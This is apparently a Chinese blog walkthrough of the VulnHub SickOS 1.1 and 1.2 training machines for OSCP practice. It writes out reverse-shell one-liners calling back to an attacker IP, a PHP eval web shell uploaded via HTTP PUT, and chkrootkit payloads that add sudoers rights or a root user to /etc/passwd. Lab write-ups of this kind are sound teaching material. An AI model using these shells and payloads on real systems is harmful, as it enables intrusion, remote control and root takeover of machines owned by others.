#  【oscp】SickOS系列全教程   
 泷羽Sec-Norsea   2025-02-02 14:49  
  
##### ~ 一份耕耘，一份收获 ~  
## SickOS1.1  
  
靶机下载链接见：  
  
https://download.vulnhub.com/sickos/sick0s1.1.7z  
  
靶机渗透，主机发现  
```
arp-scan -l

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO2821wcVhia1EPibujne2Dp4VDhrM8c6nz1TiayBhQephEqFkEZtick9l5A/640?wx_fmt=png&from=appmsg "")  
  
image-20250121142916961  
  
端口扫描，80端口是没有开启的，3128端口有一个http服务  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO9kvqYbm8etFTuDmF4G6XucUF2Pxuvc8vAapLVE94M7ohxyXibgonTEA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121153617732  
  
访问查看，这个服务呢是一个http代理，版本是3.1.19，8080端口也是一个http代理，但是已经关闭了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOaQAJlwOBM1nvia7UzAVNQtDqzibvKn6tfZXWlDB3yWuwxyvp9tK2zudw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121153522411  
  
既然是代理服务，那么我们进行目录扫描的时候，需要添加上这个代理ip+端口，不然扫不到80端口（80端口没有开启的）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOHWaOPcnXQLGUOo5lr87YU4uhYH9ngjMzrSt4ptyAgicYxefiaD0l1rwA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121165446320  
  
我们使用靶机的代理，这样就能扫描出来了，但是没有扫到后台管理的地址呢  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOPeREByUxn8vgwrvnuM8bRtGXfMxvGaicQy1uzY9Rg0XAlNvZox0d1cg/640?wx_fmt=png&from=appmsg "")  
  
image-20250121165819982  
  
并没有该系统的后台管理地址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOkb4icicklyeop6us9Wd7Sk07jgSYIiaADhOkk283szcczuxhDViamfztlw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121174716034  
  
浏览器添加代理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOrmtrDpmgLX2grGH4KjZ823DQauPUH3rqbkkiaIPusQERq9HaBPlbdyQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121170025063  
  
访问成功，可以进一步信息收集了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOfAqDLmYF526PFUfolj7Zekd9ZgjeBuPXjaAwJbIUBPicph2CRYmphew/640?wx_fmt=png&from=appmsg "")  
  
image-20250121170241604  
  
robots文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOf1FMdcTgibTdJ9wN9r2d5N0W1423QickjubWTaPAdxbdy3xaibs809gng/640?wx_fmt=png&from=appmsg "")  
  
image-20250121170255160  
  
这个文件不知道是什么，先放着  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOjlk4ia2xq8V6xDP6LFd413HpUj6db4Yy8UiclDjUJTQh1HKOjm4EzZibQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121170344575  
  
这就是wolfcms内容了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOiczTA1jydqiasNJU1ClTW8BDgtWqC67v8eC99oUHAQSvsZODTcpDZyPQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121170318879  
  
漏洞检索  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOSRV3QbJ7FwIlibhia2TKQy2iaVuAME7Nk1siaafj9ZulVmn0JLukWkyBTw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121174318460  
  
一个一个看，直到第三个漏洞描述  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOFp5xnYNVqtgJMshicle3GWYocKiaUPL5fl0STzZG19SujPYiax44YrHvw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121174624938  
  
访问，原来是多了一个问号啊  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOYSXYzzHNX2HsrZQtNyVzicp8X3XeKHjrsrZVrodaWOJwToQibGl3zoTA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121174734182  
  
弱口令admin/admin（也可以进行爆破，毕竟没有验证码）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOoJwEFtIOial7jkJlX2icbVmibDpYqQcaCmErUEbQ5B3Hia1PrFy2KtG95A/640?wx_fmt=png&from=appmsg "")  
  
image-20250121174902721  
  
上传一句话木马  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO1tRyNd7CHgibLCYgfP1y4L9grUAXicEKsbjtIF6TgmX2o76u9fktTmtA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121181027239  
  
添加代理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOtHJ7qs2CYWyzkHsiaW6KQaLX4Oibq6ib0ibOEXC0dXWv2Bghoje5NahTZQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121181240800  
  
保存后即可连接成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO8iaF0YFDbEicKyOiaibvHH6VzN7LHh9X1BpZQtKSy5OZaAQkTF2JyVm6Dw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121181323510  
  
反弹shell  
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.209.130 6666 >/tmp/f

```  
  
创建交互式终端  
```
python -c 'import pty; pty.spawn("/bin/bash")'

```  
  
得到mysql数据库账号密码  
```
root / john@123

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOGr36SjtvG7ZiavvqAeicua7WxsvSMpLKJWr6abOxv6kNjOap7ZHyWxUA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121181814708  
  
登录进去，用户表只有一个用户admin  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIObQS16qMcRGnMkibYnXBiaGybCIv3jvhPuLwYykIkeKq3qcm9bEEhXibAQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121182251138  
  
继续信息收集，回家，历史命令，SUID文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOiclXLzibhgPc0NfXAkcMZ7tzV4rYLKDWBAiahAwbZChJ5R80FMNbfNAiag/640?wx_fmt=png&from=appmsg "")  
  
image-20250121182426084  
  
计划任务  
```
ls -al /etc/cron*

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOuPdLBu4HNtNiaDwWSZNrf7ibuwKcgmt6lCNMGDcIibUJLsMasFicvfTBmA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121182759838  
  
这些工具基本上都没啥用，这里需要用上之前的数据库密码，来登录这个home下面的用户sickos  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOTHC6SFQSNCbpWvefogTvuIHJYRnOBvYRM9d8DXGHYvVAMKbGVVohqg/640?wx_fmt=png&from=appmsg "")  
  
image-20250121183201662  
  
有了密码那么就直接sudo，可以看到是所有的东西都可以执行sudo，那么就简单了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOnIH0gpOJ2W1XHQHZicIhx85yQiaM2leaY8PSJhYwVVVupzwic7l6ujzYQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121183253525  
  
直接 sudo -s 保存用户变量，切换超级用户root，也可使用sudo -i使用root的环境变量  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOqUNpChgrS30bEA1gnzmk9MuKJ9HqC4twTv5Oo0t9XPuXtGyFuguVWw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121183349861  
## SickOS1.2  
  
靶机下载链接见：  
  
https://www.vulnhub.com/entry/sickos-12,144/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOygpbmdfapDZHiaDibyXfmOmkwHvIn0LaqBicria46kqOviapW5l2oOdeEOQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250119150500029  
  
端口扫描，目标服务器开启了22端口和80端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOZN5b3eBNkOHCcBr1ZVAdYtXibfaqiaibWPibIia3TVQ6Te9dGxeSXMQwichg/640?wx_fmt=png&from=appmsg "")  
  
image-20250119150733804  
  
访问80端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOevYNepFQQbPagOgMsa6jmQxRVCJUs71KxzVQHXrDhl0C1kP51XZ0Ag/640?wx_fmt=png&from=appmsg "")  
  
image-20250119151048612  
  
第一时间查看源码，在最下面  
```
<!-- NOTHING IN HERE ///\\\ -->

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO6ImOR5AAsTPBPR4RGN4iaEeOpyQ8as06k74bxiaX76UprQ1XyqJxzXibA/640?wx_fmt=png&from=appmsg "")  
  
image-20250119151138783  
  
目录扫描  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOC8zqyNPJawtUg37xBbluhSdCsUgAf9C5hsD0CV5XOoalvtiau9H6BZQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250119151240186  
  
有一个指纹信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOjqpKl0V2rDVwaIY7abFgMrvGS2XyibVb5nngJxW28SLMxicYVKibcGWibQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250119151350131  
  
漏洞检索，并没有相关版本的漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOWlH0hNibTs7icP7cEwVsPhe7al4cgvIUdv9AiaIord3xIClpl7XHWXliaA/640?wx_fmt=png&from=appmsg "")  
  
image-20250119151453070  
  
将网页上的图片下载下来使用strings进行分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO5tcxlNFj7S8BpBol5nOf7ibDH8zhxJWNh2pwpaWEs2ERPe4lLp6Rj3Q/640?wx_fmt=png&from=appmsg "")  
  
image-20250119151913473  
  
网上搜到一种方法  
```
nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.209.133

```  
  
该命令使用Nmap的http-methods脚本检测IP为192.168.209.133的主机上Web服务的/test路径支持的HTTP方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO6wcKchPlby6bYboia5C7xp9r4cUwaQEQPibXNPWicmR8K51x833BtJhdg/640?wx_fmt=png&from=appmsg "")  
  
image-20250119152715071  
  
利用这个PUT方法，可以上传文件至目标服务器，HTTP的请求方式常见的就是GET、POST、DELETE、PUT  
  
其中PUT方法，向服务器上传一个资源，用于创建或完全替换目标资源的内容。如果资源不存在，则创建该资源；如果资源已存在，则进行更新。  
  
DELETE：请求服务器删除由URL所标识的资源。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOeVaMKPBWRaWJvcTje6CxkU0ARNMI4YvPJ1oezw6rXEulkql4n2HHKQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250119153949832  
  
那么我们尝试上传一个php文件，响应结果为创建成功  
```
<?php @eval($_POST[hack]);?>

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOrrwUq0Cxg8PiaScpKS60AunpPknxsOEmxCibwPSAGvF9lRibsZwEVkxkQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250119162243945  
  
这时候回到页面，就会发现一个新的php文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOCQo2QdyRHD1zUbwrhbdKNywE5eWx5otNkSsGBjwSYXnKm17HoOGIZQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250119163019446  
  
蚁剑i连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOckiaiceaPhrHSlMpzCNibtOHiaIjPCGg5Dttlasa8iakDNWJhrGD9rPt8iaQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250119163618402  
  
这里反弹shell试了好多种方式，都不行，看样子是对端口进行了限制，先信息收集吧，用户信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO8ia9zp1QXKqG8icAs6bwNCQquph74zOxoLo9XujfbyqXmJnWDD68Jnvw/640?wx_fmt=png&from=appmsg "")  
  
image-20250120160737933  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO5xbaWcoozZLazOMsgBtPQNdfXIibyIG5VKGcE5PNgYD1vFtP3yqAsNw/640?wx_fmt=png&from=appmsg "")  
  
image-20250120162757428  
  
系统信息收集  
```
uname -a
lsb_release -a

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOAiaWCvL0gA3icVXPZOUOCSgh38CaRoicH71TBgEUyzbdYLspqBoOKcXuQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250120162435228  
  
查找某一个用户的文件  
```
find / -user john -type f 2>/dev/null

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOLgl0apkHJohdY7LG89lFC5iajU3C5HPkPGo7PibIHHCkaI0MNDiaiaSPdQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250120162528248  
  
这里需要一个脚本，检查端口得开启情况（不是已使用的服务），默认使用iptables，但是没有权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOaxga7sVNiaRgL101IEQqJM4Z0CWq7H4DddSbYLmdyiaHSlGcPsjY9dLg/640?wx_fmt=png&from=appmsg "")  
  
image-20250120214517525  
  
这里需要用上一个脚本来检查端口的开放情况，脚本内容如下  
```
# !/bin/bash
for i in $(seq 1 65535)
do
    timeout 1 nc -vz 192.168.209.130 $i && echo "$i open" >> out.txt || echo "$i closed" >> out.txt;
done
echo "all port done"

```  
  
放到kali中，并开启http服务，并将所有端口的流量都转发到34444端口  
```
python -m http.server 5000

//备份iptables规则
iptables-save > /tmp/firewall.rules
//将所有端口的流量都转发到34444端口
iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 34444
//监听34444端口
nc -lvp 34444

```  
  
尝试从kali上下载这个文件，下载失败  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOQ6B3bqThVn3uqjzqtnGMFGI6AQ6nBX9U9AQkrPGYqURJySf2cq99lQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250120172248994  
  
切换tmp进行下载还是失败  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOWGHpD1kwltMCKByl9FufQQXY6Msnu6uSSWcZY17aiafhPDWN9j1J1aA/640?wx_fmt=png&from=appmsg "")  
  
image-20250120182502495  
  
那么就麻烦一点，传到本机上，再传到靶机  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO7zMTdPSI6OYrCHDGNy93OJetEzSH2qHicyvefWgNHdQsI7IZ4hGTgIQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250120182742532  
  
这样就能上传成功了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO0C5M7SeHMKTZ6zfpq0MicMHsFnGXtibKFUfysIZfcEe52DClVh89sYXQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250120183112857  
  
执行脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOEv0aveHlwHeUiaRQJfukfJ29U1c5dgIaiaSAuLSHBdialicWIZgVuUpxEA/640?wx_fmt=png&from=appmsg "")  
  
image-20250120212631946  
  
会生成一个txt文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOVJO7j5nGTttmHpVyRUB8uPTGRFR3tBRZkzoTRYCoPxwkmibccTbhSdg/640?wx_fmt=png&from=appmsg "")  
  
image-20250120221606777  
  
这里需要多执行几次，否则都是关闭的状态，检测不到结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOPza57MbZbVia9WG3giag8PZxOkwEOXTxeAv2H7E0OPKgArr58ZAEl0gw/640?wx_fmt=png&from=appmsg "")  
  
image-20250120235654877  
  
kali回显了，说明443端口是放行的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOoKevz8tsTUorbGaPibAqZ2dFIopkuiapebRXXntkq8dsvVOzevlibkr0w/640?wx_fmt=png&from=appmsg "")  
  
image-20250120235744147  
  
用bash反弹shell（如果反弹不成功，需要清除 iptables 的所有规则）  
```
bash -c 'bash -i >& /dev/tcp/192.168.209.130/443 0>&1'

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOCERL9hBVibNiaAXXicnoMgnIicYxwCibwy0rYolLfOlGL33IibNf8BFaTrMg/640?wx_fmt=png&from=appmsg "")  
  
image-20250121003715689  
  
创建一个交互式终端  
```
python -c 'import pty; pty.spawn("/bin/bash")'

```  
  
信息收集，我是谁？我在哪？你是谁？  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO9jMeKRb4fFiaOtJ5BUZP78J5GVAEzibiczVblaczOms3M5NZRy1r3hqSw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121004207763  
  
漏洞检索，没有任何的漏洞信息，3.11.0不在这里面的库中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOIYibR1EpV3EdmuzPBNzvvRWzianCib27Kq8XfoNCZNhQyK6Iibw5YsbB6g/640?wx_fmt=png&from=appmsg "")  
  
image-20250121004605586  
  
查看有没有gcc编译命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOgg7j7tMdAXVqsibsqtjNUiaStIWqYiaXTL0Fwk3LicbutzVDP6CnhjDMMg/640?wx_fmt=png&from=appmsg "")  
  
image-20250121004958521  
  
这里利用cve-2021-4034提权poc打，注意kali开启的端口要是443  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIONDOT6YglM1HZ1Gg7hLyCFBRAa8A6wV2Jiaaj08iaxQ2tWhvTsaDe7hyg/640?wx_fmt=png&from=appmsg "")  
  
image-20250121004931258  
  
提权失败，找其他信息（前面我们已经搜索了一些信息了，这里直接打）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOoh8U95NWMpcmxwicyb2rxMaDqBO75xfFciaw3eaUh5yE224kNicrD8S1w/640?wx_fmt=png&from=appmsg "")  
  
image-20250121005123010  
  
这里是要用到一个命令  
```
ls -al /etc/cron*

```  
  
这个命令就是说查看所有和计划任务有关的所有内容，发现了一个计划任务，chkrootkit命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOxHdnxpkulcNIMvzP8NZcen68ZQrLtYzeYeScSkjn7CUVjU74EHLupQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121014505274  
  
其中  
  
/etc/crontab：这是系统的crontab文件，用于定义系统级别的定时任务。  
  
/etc/cron.d ：该目录用于存放系统级别的定时任务配置文件。  
  
/etc/cron.daily ：这些脚本用于执行每天需要进行的系统维护任务，如更新软件包列表、清理日志文件、更新数据库等。  
  
/etc/cron.hourly ：这些脚本用于执行每小时需要进行的系统维护任务，如清理临时文件、更新缓存等。  
  
/etc/cron.monthly ：这些脚本用于执行每月需要进行的系统维护任务，如备份、报告生成等。  
  
/etc/cron.weekly ：包含多个脚本文件，这些脚本每周执行一次。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOmSfC9Nze7FsvC9mJicpst52ibpAUeJC6NsrrFJnqV48bzguKMS51rwqw/640?wx_fmt=png&from=appmsg "")  
  
image-20250121014605222  
  
找到漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOMUvrlIoIC1PLHXCTmn7bKp4uPOP99CfEfCLMyVcwj2SvgwPvk6oKvg/640?wx_fmt=png&from=appmsg "")  
  
image-20250121014626233  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIO0KiadvmMCFCRJrXicNbJTFLebpL0MQKQfP0CVnWgxsqs5iaJE6dgZ2IsA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121014748345  
```
We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

# 我们刚刚在chkrootkit包中发现了一个严重的漏洞，它可能允许本地攻击者在某些配置（/tmp而不是挂载noexec）下获得root访问权限。

```  
  
查看利用步骤  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOiaG4yibpib7lTD6BibIjQrA53L0AGUIdToia7zuatnLrQQXgcsxmTibetlXA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121015022165  
  
大致意思就是说让我们在tmp目录下面创建一个文件叫做 update ，这个update文件呢包含了一些恶意脚本，当我们运行chkrootkit这个工具的时候，这些恶意脚本也会跟着执行，并且是以root身份执行的（它是计划任务，会定时执行）  
  
这里可以利用sudo提权,，将当前用户赋予sudo权限  
```
echo 'echo "www-data  ALL=(ALL)  NOPASSWD:ALL" >> /etc/sudoers' >/tmp/update
chmod +x /tmp/update

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOZDomchniaX564rVtL8o6vicsd569QX13Ow7GnCupIpnWialNfo177HFLA/640?wx_fmt=png&from=appmsg "")  
  
image-20250121020028670  
  
也可以向 /etc/passwd 追加一个用户，密码为 password@123 （使用openssl将这个密码加盐，不加也可以，得到结果advwtv/9yU5yQ，所以完整的命令如下）  
```
echo 'echo "xiaoyu:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >>/etc/passwd' >/tmp/update

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWEJunX5ic2ZlxDGVSkQStBIOibc4oMicc7KldiaEibIlD56UsYNQRv4XktnhBKsCiaaXhIBGouu7Vlkp0vQ/640?wx_fmt=png&from=appmsg "")  
  
image-20250121021455119  
  
再者利用nc反弹shell（有思路就可以，这里没有成功）  
```
echo '/bin/bash -i >& /dev/tcp/192.168.209.130/443 0>&1' > /tmp/update

```  
  
如果有错误，或者其他方法还请师傅们指出，灰常感谢  
## 往期推荐  
  
[【oscp】IMF缓冲区提权靶机渗透](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247498138&idx=1&sn=d0066efd3259923adb91d7f83ff8249f&scene=21#wechat_redirect)  
  
  
[【oscp】FristiLeaks1.3-提权靶机渗透](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247498051&idx=1&sn=2e39d1f1fb5c356a5e1b2f9ab3325168&scene=21#wechat_redirect)  
  
  
[【OSCP】 Kioptrix 提权靶机（1-5）全系列教程，Try Harder！绝对干货！](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247496963&idx=1&sn=646e34d7b03cef9741616ea8d7e20968&scene=21#wechat_redirect)  
  
  
[从零开始学SQL注入（sql十大注入类型）：技术解析与实战演练](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247483856&idx=1&sn=cf4878d2cb5bd267f4b2d5b065dfa732&scene=21#wechat_redirect)  
  
  
[【oscp】Tr0ll 靶机全系列（1-3），FTP被玩坏了](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247497565&idx=1&sn=0495a32e8e257d65c7ad14810a22fa74&scene=21#wechat_redirect)  
  
  
  
